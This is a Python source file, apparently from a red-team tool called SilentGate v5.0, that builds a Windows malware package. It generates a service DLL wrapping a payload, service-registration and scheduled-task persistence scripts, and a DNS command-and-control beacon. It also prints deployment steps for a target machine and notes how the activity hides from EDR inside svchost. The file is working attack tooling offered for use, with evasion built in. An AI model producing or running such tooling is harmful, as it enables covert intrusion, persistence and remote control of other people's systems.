"""
SilentGate v5.0 - Orchestrator
Chains all four v5 components into one command.

Usage:
  python3 silentgate.py --phantom --payload tests/calc_payload.bin
  python3 core/v5_orchestrator.py --payload tests/calc_payload.bin
"""

import os
import sys
import argparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.v5_dll_generator     import generate as gen_dll
from core.v5_service_registrar import generate as gen_reg
from core.v5_dns_c2            import generate as gen_c2
from core.v5_persistence       import generate as gen_persist


def run(payload_path,
        service_name = "NetworkLocationHelper",
        c2_domain    = "c2.lab.local",
        output_dir   = "output/v5"):

    os.makedirs(output_dir, exist_ok=True)

    print("=" * 60)
    print("  SilentGate v5.0 - Phantom Service Generator")
    print("  Author: JarDani")
    print("=" * 60)
    print()

    # Component 1 - Spectral Service DLL
    print("[STEP 1/4] Generating Phantom Service DLL...")
    dll_success, dll_path, meta_dll = gen_dll(
        payload_path,
        service_name = service_name,
        output_dir   = output_dir
    )
    if not dll_success:
        print("[ERROR] DLL compilation failed")
        return False
    print()

    # Component 2 - Service Registration
    print("[STEP 2/4] Generating Service Registration...")
    meta_reg = gen_reg(
        dll_path,
        service_name = service_name,
        output_dir   = output_dir
    )
    print()

    # Component 3 - DNS C2 Channel
    print("[STEP 3/4] Generating DNS C2 Channel...")
    meta_c2 = gen_c2(
        c2_domain,
        output_dir          = output_dir,
        beacon_interval_ms  = 60000
    )
    print()

    # Component 4 - Persistence
    print("[STEP 4/4] Generating Persistence Mechanism...")
    meta_persist = gen_persist(
        service_name = service_name,
        output_dir   = output_dir
    )
    print()

    # Summary
    print("=" * 60)
    print("  v5.0 COMPLETE — PHANTOM SERVICE PACKAGE")
    print("=" * 60)
    print()
    print("  Files generated:")
    print(f"    {output_dir}/phantom_service.dll  <- deploy to target")
    print(f"    {output_dir}/v5_install.bat       <- run as SYSTEM on target")
    print(f"    {output_dir}/v5_task.xml          <- task scheduler XML")
    print(f"    {output_dir}/v5_persist_install.bat")
    print(f"    {output_dir}/v5_uninstall.bat     <- cleanup after engagement")
    print()
    print("  Deployment order on target:")
    print("    1. Copy phantom_service.dll to target")
    print("    2. Run v5_install.bat as Administrator")
    print("    3. Run v5_persist_install.bat as Administrator")
    print("    4. Start C2 server on Kali:")
    print(f"       python3 core/v5_dns_c2.py --server {c2_domain}")
    print()
    print("  What EDR sees:")
    print("    svchost.exe -k netsvcs  (trusted Windows process)")
    print("    DNS queries from svchost (normal NLA behaviour)")
    print("    Scheduled task in Microsoft\\Windows\\Network (normal)")
    print()
    print("  Cleanup after engagement:")
    print("    Run v5_uninstall.bat + v5_persist_cleanup.bat")
    print()

    return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SilentGate v5.0 - Phantom Service Generator"
    )
    parser.add_argument("--payload",  required=True,
                        help="Path to payload binary")
    parser.add_argument("--service",  default="NetworkLocationHelper",
                        help="Service name")
    parser.add_argument("--c2",       default="c2.lab.local",
                        help="C2 domain for DNS beacon")
    parser.add_argument("--output",   default="output/v5",
                        help="Output directory")
    args = parser.parse_args()

    success = run(
        payload_path = args.payload,
        service_name = args.service,
        c2_domain    = args.c2,
        output_dir   = args.output
    )

    sys.exit(0 if success else 1)
